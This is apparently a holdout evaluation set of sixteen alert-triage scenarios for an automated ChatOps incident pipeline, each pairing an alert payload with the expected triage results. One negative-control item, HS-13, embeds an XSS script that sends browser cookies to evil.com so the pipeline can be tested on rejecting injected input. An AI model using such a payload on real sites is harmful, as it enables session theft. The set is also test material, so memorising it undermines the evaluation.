@@ -1,0 +1,360 @@
+[
+  {
+    "_comment": "HOLDOUT SET — Do NOT use these scenarios during prompt optimization or triage tuning. Run monthly only. Contamination invalidates the holdout.",
+    "id": "HS-01",
+    "name": "LibreNMS device down — Synology NAS (NL)",
+    "category": "availability",
+    "site": "nl",
+    "payload": {
+      "alert_type": "librenms",
+      "hostname": "nl-nas01",
+      "alert_rule": "Device Down! Due to no ICMP response.",
+      "severity": "critical",
+      "state": "alert"
+    },
+    "expected": {
+      "issue_created": true,
+      "yt_project": "IFRNLLEI01PRD",
+      "matrix_room": "#infra-nl-prod",
+      "triage_must_contain": ["netbox", "ping", "Synology", "storage"],
+      "confidence_range": [0.3, 0.9],
+      "must_have_react": true,
+      "must_have_approval_gate": true,
+      "max_cost_usd": 3.0,
+      "alert_category": "availability"
+    }
+  },
+  {
+    "id": "HS-02",
+    "name": "LibreNMS device down — GR K8s control plane",
+    "category": "availability",
+    "site": "gr",
+    "payload": {
+      "alert_type": "librenms",
+      "hostname": "grcp01",
+      "alert_rule": "Device Down! Due to no ICMP response.",
+      "severity": "critical",
+      "state": "alert"
+    },
+    "expected": {
+      "issue_created": true,
+      "yt_project": "IFRGRSKG01PRD",
+      "matrix_room": "#infra-gr-prod",
+      "triage_must_contain": ["netbox", "ping", "K8s", "control plane"],
+      "confidence_range": [0.4, 0.9],
+      "must_have_react": true,
+      "must_have_approval_gate": true,
+      "max_cost_usd": 3.0,
+      "alert_category": "availability"
+    }
+  },
+  {
+    "id": "HS-03",
+    "name": "Prometheus K8s node NotReady",
+    "category": "kubernetes",
+    "site": "nl",
+    "payload": {
+      "alert_type": "prometheus",
+      "alertname": "KubeNodeNotReady",
+      "node": "nlworker01",
+      "severity": "critical",
+      "status": "firing"
+    },
+    "expected": {
+      "issue_created": true,
+      "yt_project": "IFRNLLEI01PRD",
+      "matrix_room": "#infra-nl-prod",
+      "triage_must_contain": ["kubectl", "node", "NotReady", "kubelet"],
+      "confidence_range": [0.4, 0.9],
+      "must_have_react": true,
+      "must_have_approval_gate": true,
+      "max_cost_usd": 4.0,
+      "alert_category": "kubernetes"
+    }
+  },
+  {
+    "id": "HS-04",
+    "name": "Prometheus K8s persistent volume full",
+    "category": "kubernetes",
+    "site": "gr",
+    "payload": {
+      "alert_type": "prometheus",
+      "alertname": "KubePersistentVolumeFillingUp",
+      "namespace": "monitoring",
+      "persistentvolumeclaim": "thanos-store-data-0",
+      "usage_percent": 95,
+      "severity": "warning",
+      "status": "firing"
+    },
+    "expected": {
+      "issue_created": true,
+      "yt_project": "IFRGRSKG01PRD",
+      "matrix_room": "#infra-gr-prod",
+      "triage_must_contain": ["kubectl", "PVC", "disk", "expand"],
+      "confidence_range": [0.3, 0.9],
+      "must_have_react": true,
+      "must_have_approval_gate": true,
+      "max_cost_usd": 3.0,
+      "alert_category": "kubernetes"
+    }
+  },
+  {
+    "id": "HS-05",
+    "name": "LibreNMS high CPU — GR firewall",
+    "category": "network",
+    "site": "gr",
+    "payload": {
+      "alert_type": "librenms",
+      "hostname": "gr-fw01",
+      "alert_rule": "Processor usage exceeds 90%",
+      "severity": "warning",
+      "state": "alert"
+    },
+    "expected": {
+      "issue_created": true,
+      "yt_project": "IFRGRSKG01PRD",
+      "matrix_room": "#infra-gr-prod",
+      "triage_must_contain": ["CPU", "firewall", "ASA", "crypto"],
+      "confidence_range": [0.3, 0.8],
+      "must_have_react": true,
+      "must_have_approval_gate": true,
+      "max_cost_usd": 3.0,
+      "alert_category": "network"
+    }
+  },
+  {
+    "id": "HS-06",
+    "name": "Prometheus SeaweedFS volume server unreachable",
+    "category": "storage",
+    "site": "nl",
+    "payload": {
+      "alert_type": "prometheus",
+      "alertname": "SeaweedFSVolumeServerDown",
+      "namespace": "seaweedfs",
+      "pod": "seaweedfs-volume-0",
+      "severity": "critical",
+      "status": "firing"
+    },
+    "expected": {
+      "issue_created": true,
+      "yt_project": "IFRNLLEI01PRD",
+      "matrix_room": "#infra-nl-prod",
+      "triage_must_contain": ["SeaweedFS", "volume", "replication", "000"],
+      "confidence_range": [0.3, 0.9],
+      "must_have_react": true,
+      "must_have_approval_gate": true,
+      "max_cost_usd": 4.0,
+      "alert_category": "storage"
+    }
+  },
+  {
+    "id": "HS-07",
+    "name": "CrowdSec HTTP exploit attempt (GR DMZ)",
+    "category": "security",
+    "site": "gr",
+    "payload": {
+      "alert_type": "crowdsec",
+      "hostname": "gr-dmz01",
+      "scenario": "crowdsecurity/http-probing",
+      "source_ip": "198.51.100.77",
+      "decisions": [{"type": "ban", "duration": "24h"}],
+      "severity": "high"
+    },
+    "expected": {
+      "issue_created": true,
+      "yt_project": "IFRGRSKG01PRD",
+      "matrix_room": "#infra-gr-prod",
+      "triage_must_contain": ["CrowdSec", "HTTP", "probing", "ban"],
+      "confidence_range": [0.3, 0.8],
+      "must_have_react": true,
+      "must_have_approval_gate": true,
+      "max_cost_usd": 2.0,
+      "alert_category": "security"
+    }
+  },
+  {
+    "id": "HS-08",
+    "name": "Correlated burst — 3 hosts (GR storage + compute)",
+    "category": "correlated",
+    "site": "gr",
+    "payload": {
+      "alert_type": "correlated",
+      "hosts": ["gr-pve02", "grworker01", "grworker02"],
+      "alert_rule": "Device Down! Due to no ICMP response.",
+      "severity": "critical",
+      "burst_count": 3,
+      "burst_window_minutes": 4
+    },
+    "expected": {
+      "issue_created": true,
+      "yt_project": "IFRGRSKG01PRD",
+      "matrix_room": "#infra-gr-prod",
+      "triage_must_contain": ["correlated", "iSCSI", "shared root cause"],
+      "confidence_range": [0.3, 0.7],
+      "must_have_react": true,
+      "must_have_approval_gate": true,
+      "must_have_poll": true,
+      "max_cost_usd": 5.0,
+      "alert_category": "correlated",
+      "plan_mode": true
+    }
+  },
+  {
+    "id": "HS-09",
+    "name": "Alert during post-maintenance cooldown (NL)",
+    "category": "maintenance",
+    "site": "nl",
+    "payload": {
+      "alert_type": "librenms",
+      "hostname": "nl-pve03",
+      "alert_rule": "Device Down! Due to no ICMP response.",
+      "severity": "critical",
+      "state": "alert",
+      "post_maintenance_cooldown": true,
+      "cooldown_minutes_remaining": 8
+    },
+    "expected": {
+      "issue_created": true,
+      "yt_project": "IFRNLLEI01PRD",
+      "matrix_room": "#infra-nl-prod",
+      "triage_must_contain": ["post-maintenance", "cooldown", "recovery"],
+      "confidence_range": [0.2, 0.6],
+      "must_have_react": true,
+      "must_have_approval_gate": true,
+      "max_cost_usd": 3.0,
+      "alert_category": "availability"
+    }
+  },
+  {
+    "id": "HS-10",
+    "name": "Negative: test/synthetic hostname (not real)",
+    "category": "negative-control",
+    "site": "nl",
+    "payload": {
+      "alert_type": "librenms",
+      "hostname": "test-server-01",
+      "alert_rule": "Device Down! Due to no ICMP response.",
+      "severity": "critical",
+      "state": "alert"
+    },
+    "expected": {
+      "should_trigger": false,
+      "reason": "Hostname 'test-server-01' does not match site naming convention (nl*/gr*), likely synthetic"
+    }
+  },
+  {
+    "id": "HS-11",
+    "name": "Negative: cross-site alert with wrong project (GR host, NL project)",
+    "category": "negative-control",
+    "site": "gr",
+    "payload": {
+      "alert_type": "librenms",
+      "hostname": "gr-pve01",
+      "alert_rule": "Device Down! Due to no ICMP response.",
+      "severity": "critical",
+      "state": "alert",
+      "forced_project": "IFRNLLEI01PRD"
+    },
+    "expected": {
+      "should_trigger": false,
+      "reason": "GR hostname misrouted to NL project — site/project mismatch should be caught by routing logic"
+    }
+  },
+  {
+    "id": "HS-12",
+    "name": "Negative: alert with future timestamp",
+    "category": "negative-control",
+    "site": "nl",
+    "payload": {
+      "alert_type": "librenms",
+      "hostname": "nl-pve01",
+      "alert_rule": "Device Down! Due to no ICMP response.",
+      "severity": "critical",
+      "state": "alert",
+      "timestamp": "2027-01-01T00:00:00Z"
+    },
+    "expected": {
+      "should_trigger": false,
+      "reason": "Alert timestamp is in the future, likely clock skew or replay attack"
+    }
+  },
+  {
+    "id": "HS-13",
+    "name": "Negative: XSS in alert body",
+    "category": "negative-control",
+    "site": "nl",
+    "payload": {
+      "alert_type": "matrix_message",
+      "sender": "@attacker:external.server",
+      "room": "#chatops",
+      "body": "<script>fetch('https://evil.com/steal?token='+document.cookie)</script> Server down!"
+    },
+    "expected": {
+      "should_trigger": false,
+      "reason": "HTML/JS injection in message body, must be sanitized before processing"
+    }
+  },
+  {
+    "id": "HS-14",
+    "name": "Negative: alert from decommissioned room",
+    "category": "negative-control",
+    "site": "nl",
+    "payload": {
+      "alert_type": "matrix_message",
+      "sender": "@user:matrix.example.net",
+      "room": "#claude-gateway",
+      "body": "nl-pve01 is not responding to SSH"
+    },
+    "expected": {
+      "should_trigger": false,
+      "reason": "Message from decommissioned #claude-gateway room, should not trigger triage"
+    }
+  },
+  {
+    "id": "HS-15",
+    "name": "Dev issue — CUBEOS integration test",
+    "category": "dev",
+    "site": "nl",
+    "payload": {
+      "alert_type": "youtrack",
+      "issue_id": "CUBEOS-1100",
+      "summary": "Add end-to-end radio link budget test",
+      "description": "Create integration test that validates full LoRa link budget from TX power through antenna gain, path loss, and RX sensitivity for all supported spreading factors."
+    },
+    "expected": {
+      "matrix_room": "#cubeos",
+      "triage_must_contain": ["PLAN", "IMPLEMENT", "VERIFY"],
+      "confidence_range": [0.5, 1.0],
+      "must_have_react": false,
+      "must_have_approval_gate": false,
+      "max_cost_usd": 5.0,
+      "alert_category": "general",
+      "prompt_variant_recorded": true
+    }
+  },
+  {
+    "id": "HS-16",
+    "name": "Prometheus Cilium ClusterMesh connectivity loss",
+    "category": "kubernetes",
+    "site": "nl",
+    "payload": {
+      "alert_type": "prometheus",
+      "alertname": "CiliumClusterMeshUnreachable",
+      "namespace": "kube-system",
+      "remote_cluster": "gr",
+      "severity": "critical",
+      "status": "firing"
+    },
+    "expected": {
+      "issue_created": true,
+      "yt_project": "IFRNLLEI01PRD",
+      "matrix_room": "#infra-nl-prod",
+      "triage_must_contain": ["ClusterMesh", "Cilium", "cross-site", "VPN"],
+      "confidence_range": [0.4, 0.9],
+      "must_have_react": true,
+      "must_have_approval_gate": true,
+      "max_cost_usd": 4.0,
+      "alert_category": "kubernetes"
+    }
+  }
+]
